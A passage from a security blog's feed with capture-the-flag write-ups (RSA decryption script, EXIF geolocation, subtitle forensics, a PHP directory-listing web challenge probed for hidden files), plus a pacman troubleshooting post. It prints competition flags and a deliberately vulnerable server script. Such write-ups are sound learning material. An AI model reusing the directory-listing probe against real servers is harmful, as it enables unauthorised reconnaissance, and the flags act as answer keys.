<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">irb(main):003:0&gt; &quot;&#123;C0+GRATZ_Y0U_3OLVE_1T&#125;&quot;.downcase</div><div class="line">=&gt; &quot;&#123;c0+gratz_y0u_3olve_1t&#125;&quot;</div></pre></td></tr></table></figure></p>
<p>But that was not good (no flag format...), I needed to remove curly braces and change <code>+</code> into <code>n</code>: <code>c0ngratz_y0u_3olve_1t</code>.</p>
<h2 id="150-rsa-crypto">150 - RSA - Crypto</h2>
<blockquote>
<p>RSA 쉽던데..?</p>
<p>RSA is easy, huh?</p>
<p>#Change Code due to logic error</p>
<p>#Change server address due to server overload</p>
<p>nc 203.251.182.94 4000</p>
<p><a href="https://drive.google.com/open?id=0B4SaQn817BNcck83M3lyS1dHc1E" target="_blank" rel="external">https://drive.google.com/open?id=0B4SaQn817BNcck83M3lyS1dHc1E</a></p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&gt; if True:</div><div class="line">&gt;    enc_data = SECRET_LOGIC()</div><div class="line">&gt;    enc = powmod(enc_data, e, n)</div><div class="line">&gt;    conn.send(&quot;enc : %d\ne : %d\np : %d\nq : %d\n&quot; % (enc, e, p, q))</div><div class="line">&gt;</div><div class="line">&gt;    recv = conn.recv(1024)</div><div class="line">&gt;</div><div class="line">&gt;    if end - start &gt; 1:</div><div class="line">&gt;        conn.send(&quot;time out&quot;)</div><div class="line">&gt;        conn.close()</div><div class="line">&gt;</div><div class="line">&gt;    if recv == enc_data:</div><div class="line">&gt;        conn.send(FLAG)</div><div class="line">&gt;        conn.close()</div><div class="line">&gt;</div><div class="line">&gt;    conn.send(&quot;wrong&quot;)</div><div class="line">&gt;    conn.close()</div><div class="line">&gt;</div><div class="line">&gt; else:</div><div class="line">&gt;    conn.close()</div><div class="line">&gt;    print &quot;error&quot;</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>I wrote a ruby script to solve this RSA:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span></div><div class="line"></div><div class="line"><span class="comment"># Source of int2Text: http://stackoverflow.com/questions/42993763/how-to-convert-bytes-in-number-into-a-string-of-characters-character-represent#42999986</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2Text</span><span class="params">(int)</span></span></div><div class="line">    a = []</div><div class="line">    <span class="keyword">while</span> int&gt;<span class="number">0</span></div><div class="line">        a &lt;&lt; (int &amp; <span class="number">0xFF</span>)</div><div class="line">        int <span class="meta">&gt;&gt;= </span><span class="number">8</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    <span class="keyword">return</span> a.reverse.pack(<span class="string">'C*'</span>)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Source of egcd: https://gist.github.com/jsanders/6735046</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span></span></div><div class="line">  u_a, v_a, u_b, v_b = [ <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> ]</div><div class="line">  <span class="keyword">while</span> a != <span class="number">0</span></div><div class="line">    q = b / a</div><div class="line">    a, b = [ b - q*a, a ]</div><div class="line">    u_a, v_a, u_b, v_b = [ u_b - q*u_a, v_b - q*v_a, u_a, v_a ]</div><div class="line">    <span class="comment"># Each time, `u_a*a' + v_a*b' = a` and `u_b*a' + v_b*b' = b`</span></div><div class="line">  <span class="keyword">end</span></div><div class="line">  [ b, u_b, v_b ]</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span></span></div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    <span class="keyword">if</span> g != <span class="number">1</span></div><div class="line">        raise <span class="string">'modular inverse does not exist'</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> x % m</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Server connection</span></div><div class="line">hostname = <span class="string">'203.251.182.94'</span></div><div class="line">port = <span class="number">4000</span></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line">raw = <span class="string">''</span></div><div class="line">answer_sent = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/q :/</span>) &amp;&amp; answer_sent == <span class="literal">false</span></div><div class="line">        c = raw.match(<span class="regexp">/^enc : ([0-9]*)$/</span>).captures[<span class="number">0</span>].to_i</div><div class="line">        e = raw.match(<span class="regexp">/^e : ([0-9]*)$/</span>).captures[<span class="number">0</span>].to_i</div><div class="line">        p_int = raw.match(<span class="regexp">/^p : ([0-9]*)$/</span>).captures[<span class="number">0</span>].to_i</div><div class="line">        q = raw.match(<span class="regexp">/^q : ([0-9]*)$/</span>).captures[<span class="number">0</span>].to_i</div><div class="line">        phi = (p_int - <span class="number">1</span>) * (q - <span class="number">1</span>)</div><div class="line">        d = modinv(e, phi)</div><div class="line">        n = p_int*q</div><div class="line"></div><div class="line">        <span class="comment"># more efficient than m_int = (c ** d) % n</span></div><div class="line">        m_int = c.to_bn.mod_exp(d, n).to_i</div><div class="line"></div><div class="line">        <span class="comment"># cleartext is base64 containing an integer</span></div><div class="line">        m_b64 = int2Text(m_int)</div><div class="line">        puts <span class="string">"base64 : <span class="subst">#&#123;m_b64&#125;</span>"</span></div><div class="line">        m = Base64.decode64(m_b64)</div><div class="line">        puts <span class="string">"int : <span class="subst">#&#123;m&#125;</span>"</span></div><div class="line">        <span class="comment"># integer must be transform to text again</span></div><div class="line">        m_text = int2Text(m.to_i)</div><div class="line">        puts <span class="string">"text : <span class="subst">#&#123;m_text&#125;</span>"</span></div><div class="line">        s.puts m_text</div><div class="line">        answer_sent = <span class="literal">true</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure></p>
<p>An example of output from my script:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ ruby rsa.rb</div><div class="line">enc : 491122313213059047386587355703000827178576243139630115107824179230229619638230359264090916176374104821742487423477640046091956570072907849863979916992012277080517371737063659607380884337353809683315958180812970513119961236305718314856508806575062351521772465118704267216578937782652026891140564554699280499155421872621380063738498801480672462553217846124110631365349374404141214553794903345385240728734320886304119126434949216541748009316097394118225456235324726150812532266854157628444800299612332540488915092939585065747993258534210496110027307168741103227954668422763393074609550128115559442563807710071873205546623595056058012799686847872624717521357873024268621752914303954208374908780786312254128829726625119613542022988078172368143379162734941970190142937076819213707077010206986159149431729867187504847837987139017023926853873484450256772068033378979496285329969789758899711272261594435793646971822229226412599644872158251842719957278621048558842287038138868659481907505634015392299324362317019730935313919966703702616226085783306686686638481716975435704933248720402377816087988961312653435421407390516891418321288636502551122036111983361547523717812270804583522804832003079689675943949319910428221021037993090021553176551473</div><div class="line">e : 65537</div><div class="line">p : 32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891541065808607552399123930385521954285833276606292740174507176908054077273016103644389803261062635470374515595892199454891155463898488297024308700957247533881208055894474582694028535079545281620566442541400114261729854235365927395115457109476960042332821732358509197923144094801013581965651112146928918286923938064987973879624251895591220179</div><div class="line">q : 32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891541065808607552399123930385521990685772174514834944123086486002362345153147580453526134037171595087108668773961917317502849945855689432886442889958513294157709640362363734479327004391952407569596153273880472331909250263593691635107321048666489395316204775782962517724272901158130972610802371589601746375325078943967095960733617174538141999</div><div class="line">base64 : NTEzMjU2MzI3MTA4MDgzNzE3Mjg4MzE2OTU4MTc4MTEwNTI1NzE4OTEyMTM0MDMzNTY3Mjc3Njc2NTI1MjYxMjI5MjExMzE0MDE1ODk=</div><div class="line">int : 51325632710808371728831695817811052571891213403356727767652526122921131401589</div><div class="line">text : qyGUcwNSzMF8uCOxByuBpTZ53Bn2IJau</div><div class="line">flag&#123;Y34hh_RSA_1S_S0_E4sy&#125;</div></pre></td></tr></table></figure></p>
<p>Flag is: <code>Y34hh_RSA_1S_S0_E4sy</code>.</p>
<h2 id="50-instead-of-5-billion-won-i-give-you-a-cute-handcuffs-misc">50 - Instead of 5 billion won, I give you a cute handcuffs - Misc</h2>
<blockquote>
<p>In the fall of 2016, an e-mail arrived to detective Kim, who is tracking up economic fugitives who have shed large amounts of money from a large corporation.</p>
<p>I know the location of the perpetrator, but I can not tell you, and if you pay me 5 billion, I was attached with a photograph that would tell you the exact location.</p>
<p>The attached photo was taken nearest to his refuge.</p>
<p>Can Kim find out where the shooter escaped?</p>
<p>(The correct answer is the address in Korea. Example: 52-3, Yeonsan-dong, Yeonje-gu, Busan, Republic of Korea)</p>
<p><a href="https://drive.google.com/open?id=0B4SaQn817BNceWIxTlE5RVlIbkU" target="_blank" rel="external">https://drive.google.com/open?id=0B4SaQn817BNceWIxTlE5RVlIbkU</a></p>
</blockquote>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$ exiftool 1.JPG | grep -i gps</div><div class="line">GPS Latitude Ref                : North</div><div class="line">GPS Longitude Ref               : East</div><div class="line">GPS Altitude Ref                : Above Sea Level</div><div class="line">GPS Time Stamp                  : 04:50:51</div><div class="line">GPS Speed Ref                   : km/h</div><div class="line">GPS Speed                       : 0</div><div class="line">GPS Img Direction Ref           : True North</div><div class="line">GPS Img Direction               : 115.244898</div><div class="line">GPS Dest Bearing Ref            : True North</div><div class="line">GPS Dest Bearing                : 115.244898</div><div class="line">GPS Date Stamp                  : 2016:11:06</div><div class="line">GPS Horizontal Positioning Error: 10 m</div><div class="line">GPS Altitude                    : 95.3 m Above Sea Level</div><div class="line">GPS Date/Time                   : 2016:11:06 04:50:51Z</div><div class="line">GPS Latitude                    : 37 deg 40&apos; 11.91&quot; N</div><div class="line">GPS Longitude                   : 127 deg 0&apos; 29.88&quot; E</div><div class="line">GPS Position                    : 37 deg 40&apos; 11.91&quot; N, 127 deg 0&apos; 29.88&quot; E</div></pre></td></tr></table></figure></p>
<p>Google Maps sucks: <code>DEG40, 94551, Deggendorf, Niederbayern, Bayern, Allemagne</code></p>
<p><a href="http://www.findlatitudeandlongitude.com/?lat=37.4192&amp;lon=-122.057&amp;zoom=10&amp;map_type=G_NORMAL_MAP#.WNbyDK21vTg" target="_blank" rel="external">findlatitudeandlongitude.com</a> works better: <code>238-1 Ui-dong, Gangbuk-gu, Seoul, South Korea</code> but we need to respect description format: <code>238-1, Ui-dong, Gangbuk-gu, Seoul, Republic of Korea</code>.</p>
<h2 id="50-cute-forensic">50 - Cute - Forensic</h2>
<blockquote>
<p>Very cute..</p>
<p><a href="https://drive.google.com/open?id=0B4SaQn817BNcOFJmel91OFA4azA" target="_blank" rel="external">https://drive.google.com/open?id=0B4SaQn817BNcOFJmel91OFA4azA</a></p>
</blockquote>
<p>The file is a mkv (Matroska):</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ file file</div><div class="line">file: Matroska data</div><div class="line"></div><div class="line">$ mv file file.mkv</div></pre></td></tr></table></figure></p>
<p>There is a subtitle track. We can see with <code>mkvtoolnix</code> that the subtitle track id for <code>mkextract</code> is <code>2</code>.</p>
<p>So I extracted it:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ mkvextract tracks &quot;file.mkv&quot; 2:out.srt</div></pre></td></tr></table></figure></p>
<p>And we get someting like:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">1</div><div class="line">00:00:01,000 --&gt; 00:00:01,021</div><div class="line">e</div><div class="line"></div><div class="line">2</div><div class="line">00:00:01,022 --&gt; 00:00:01,042</div><div class="line">eh</div><div class="line"></div><div class="line">3</div><div class="line">00:00:01,043 --&gt; 00:00:01,064</div><div class="line">eh~</div><div class="line"></div><div class="line">4</div><div class="line">00:00:01,065 --&gt; 00:00:01,086</div><div class="line">eh~!</div><div class="line"></div><div class="line">5</div><div class="line">00:00:01,087 --&gt; 00:00:01,108</div><div class="line">eh~!@</div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">81</div><div class="line">00:00:10,539 --&gt; 00:00:10,539</div><div class="line">f</div><div class="line"></div><div class="line">82</div><div class="line">00:00:10,539 --&gt; 00:00:10,539</div><div class="line">l</div><div class="line"></div><div class="line">83</div><div class="line">00:00:10,539 --&gt; 00:00:10,539</div><div class="line">a</div><div class="line"></div><div class="line">84</div><div class="line">00:00:10,539 --&gt; 00:00:10,539</div><div class="line">g</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>So we can see <code>flag</code> from the entry 81. Flag is written between entries 81 and 110: <code>flag{v3r_cut3_p4Rr0t_12nt_!t?}</code>.</p>
<p>Flag is <code>v3r_cut3_p4Rr0t_12nt_!t?</code>.</p>
<h2 id="100-iterator-web">100 - iterator - Web</h2>
<p><strong>Warning</strong> : we didn't flag this challenge!</p>
<p>The server is executing:</p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$directory = $_GET[<span class="string">'dir'</span>];</div><div class="line">$cond = explode(<span class="string">"="</span>, urldecode($_SERVER[<span class="string">'QUERY_STRING'</span>]));</div><div class="line"><span class="keyword">if</span> (!is_dir($cond[<span class="number">1</span>])) <span class="keyword">echo</span> <span class="string">'folder does not exist.'</span>;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    $directory = <span class="keyword">new</span> DirectoryIterator($directory);</div><div class="line">    <span class="keyword">foreach</span>($directory <span class="keyword">as</span> $file) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;!--"</span>;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/txt$/i"</span>, $file-&gt;getFilename())) <span class="keyword">echo</span> $file-&gt;getFilename();</div><div class="line">        <span class="keyword">else</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"--&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>Ok so let's try <code>/var/www/html</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!--534dddm3.txt--&gt;</div><div class="line">&lt;!----&gt;</div><div class="line">&lt;!----&gt;</div><div class="line">&lt;!----&gt;</div><div class="line">&lt;!----&gt;</div><div class="line">&lt;!----&gt;</div></pre></td></tr></table></figure></p>
<p>Now try to reach <code>http://175.214.81.36/534dddm3.txt</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hello! If you are reading this article you have succeeded in reading the file.</div><div class="line">what is left is finding a hidden diretory!</div></pre></td></tr></table></figure></p>
<p>We didn't manage to find the hidden directory.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
    
      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>ArchLinux - Pacman error: $filename exists in filesystem</title>
    <link href="https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/"/>
    <id>https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/</id>
    <published>2017-03-20T23:00:00.000Z</published>
    <updated>2017-03-21T23:03:54.744Z</updated>
    
    <content type="html"><![CDATA[<p>Before each update, check <a href="https://www.archlinux.org/news/" target="_blank" rel="external">Archlinux news</a>, there may be special instructions.</p>
<p>When updating you system with <code># pacman -Syu</code> you may sometimes encounter this error:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: could not prepare transaction</div><div class="line">error: failed to commit transaction (conflicting files)</div><div class="line">libname: /absolut/file/path exists in filesystem</div><div class="line">Errors occurred, no packages were upgraded.</div></pre></td></tr></table></figure></p>
<p><code>pacman</code> has detected a file conflict, and is preventing you to overwrite those files. So it's user responsability to take a decision.</p>
<p>To solve this you have to check that those files are not used by any installed package with the command: <code>$ pacman -Qo /absolut/file/path</code>.</p>
<p>If no package is using the file you will get this normal error:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ pacman -Qo /absolut/file/path</div><div class="line">error: No package owns /absolut/file/path</div></pre></td></tr></table></figure></p>
<p>Now you can rename the file (<code>mv /path/file.ext /path/file.ext.bck</code>), then try the update again <code># pacman -Syu</code> and then remove the, now, useless file (<code>rm /path/file.ext.bck</code>).</p>
<p>But if the file is used <a href="https://wiki.archlinux.org/index.php/Reporting_bug_guidelines" target="_blank" rel="external">report a bug</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Before each update, check &lt;a href=&quot;https://www.archlinux.org/news/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Archlinux news&lt;/a&gt;, there may be speci
    
    </summary>
    
      <category term="linux" scheme="https://rawsec.ml/categories/linux/"/>
    
      <category term="archlinux" scheme="https://rawsec.ml/categories/linux/archlinux/"/>
    
    
      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
    
      <category term="archlinux" scheme="https://rawsec.ml/tags/archlinux/"/>
    
  </entry>
  
  <entry>
    <title>EasyCTF 2017 - Write-ups</title>
    <link href="https://rawsec.ml/en/EasyCTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/EasyCTF-2017-write-ups/</id>
    <published>2017-03-20T23:00:00.000Z</published>
    <updated>2017-03-21T22:26:02.646Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : EasyCTF 2017</li>
<li><strong>Website</strong> : <a href="https://www.easyctf.com/" target="_blank" rel="external">easyctf.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/441" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="5-irc-miscellaneous">5 - IRC - Miscellaneous</h2>
<blockquote>
<p>EasyCTF has an IRC channel! Check out <code>#easyctf2017</code> on freenode to claim a free flag, and stick around to get on-the-fly updates during the competition.</p>
</blockquote>
<p>Flag: <code>easyctf{irc_d0esn7_apist0rm_:)}</code></p>
<h2 id="10-hello-world-programming">10 - Hello, world! - Programming</h2>
<blockquote>
<p>Use your favorite programming language to print <code>Hello, world!</code> to stdout! Use the programming interface to do this!</p>
<p>Programming Judge codes:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt; AC: accepted</div><div class="line">&gt; WA: WRONG ANSWER (you&apos;re bad)</div><div class="line">&gt; TLE: time limit exceeded (make your code faster)</div><div class="line">&gt; RTE: runtime error</div><div class="line">&gt; JE: judge error (contact an admin if you encounter this)</div><div class="line">&gt; CE: compilation error</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>Python3 code:</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python3</span></div><div class="line">print(<span class="string">"Hello, world!"</span>)</div></pre></td></tr></table></figure></p>
<h2 id="15-things-add-up-programming">15 - Things Add Up - Programming</h2>
<blockquote>
<p>For this problem you will utilise the programming interface, which you can access via the navigation bar at the top of your screen.</p>
<p>The input for your program will be given via STDIN - that's <code>cin</code>, <code>input()</code>, and <code>System.in</code> for cxx, Python, and Java respectively. Output goes to STDOUT - <code>cout</code>, <code>print</code>, and <code>System.out</code>. Your program will be run on several sets of input, and if your output matches ours for each testcase, this problem will be marked solved.</p>
<p>We'll start with a simple challenge. Each testcase has two lines of input. The first will contain an integer <code>N</code>. The second will contain a sequence of integers <code>a_1, a_2, ..., a_N</code>. You are to output the sum of that sequence - that is, <code>a_1 + a_2 + ... + a_n</code>. Good luck!</p>
<h4 id="input-constraints">Input Constraints</h4>
<p><code>0 &lt; N &lt; 100</code></p>
<p><code>-1000 &lt; a_i &lt; 1000</code></p>
<h4 id="sample-input">Sample Input</h4>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; 5</div><div class="line">&gt; 2 4 7 3 1</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<h2 id="sample-output">Sample Output</h2>
<p><code>17</code></p>
</blockquote>
<p>Python3 code:</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># total</span></div><div class="line">tot = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># N</span></div><div class="line">N = int(input())</div><div class="line"></div><div class="line"><span class="comment"># sequence</span></div><div class="line">a_ = input().split(<span class="string">' '</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a_:</div><div class="line">    tot += int(i)</div><div class="line"></div><div class="line">print(tot)</div></pre></td></tr></table></figure></p>
<h2 id="20-flip-my-letters-cryptography">20 - Flip My Letters - Cryptography</h2>
<blockquote>
<p>I dropped my alphabet on its head, can you help me reassemble it? <code>easyctf{r_wlmg_vevm_mvvw_zm_zhxrr_gzyov}</code></p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p>What happens if you turn the alphabet upside down?</p>
</blockquote>
<p>It is some <em>Backward Alphabet Code</em>. I used <a href="https://www.theproblemsite.com/reference/mathematics/codes/backwards-alphabet-code" target="_blank" rel="external">theproblemsite.com</a> to solve this: <code>easyctf{i_dont_even_need_an_ascii_table}</code>.</p>
<h2 id="20-clear-and-concise-commentary-on-caesar-cipher-cryptography">20 - Clear and Concise Commentary on Caesar Cipher - Cryptography</h2>
<blockquote>
<p>I tried to hide a flag sneakily, can you find it? <a href="https://www.easyctf.com/static/0f2b8968db2219e13d4e40125baede48a6ee77af_hexable" target="_blank" rel="external">Download</a></p>
</blockquote>
<p>It's easy to find a bunch of ciphertext:</p>
<ul>
<li><code>omz kag odmow ftue oubtqd</code></li>
<li><code>h fns sghr qhfgs sghr shld</code></li>
<li><code>WKLV LV QRW WKH IODJ</code></li>
<li><code>xaywqoa fqheqo eo ykkh hega pdwp</code></li>
<li><code>ldnv bdzrzq hr dzrx</code></li>
<li><code>RNFLPGS{LBHTBGVG}</code></li>
<li><code>omt vbvdi</code></li>
<li><code>gmbbbbbbbbbbbbh</code></li>
</ul>
<p>Just crack the ceasar code (with some ruby):</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># from https://gist.github.com/matugm/db363c7131e6af27716c</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_cipher</span><span class="params">(string, shift = <span class="number">1</span>)</span></span></div><div class="line">    alphabet   = Array(<span class="string">'a'</span>..<span class="string">'z'</span>)</div><div class="line">    encrypter  = Hash[alphabet.zip(alphabet.rotate(shift))]</div><div class="line">    <span class="comment"># " " =&gt; c because I don't want to void non-letters chars</span></div><div class="line">    string.chars.map &#123; <span class="params">|c|</span> encrypter.fetch(c, c) &#125;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">ciphertext = <span class="string">'RNFLPGS&#123;LBHTBGVG&#125;'</span>.downcase</div><div class="line"></div><div class="line">(<span class="number">1</span>...<span class="number">26</span>).each <span class="keyword">do</span> <span class="params">|n|</span></div><div class="line">    puts caesar_cipher(ciphertext, n).join</div><div class="line"><span 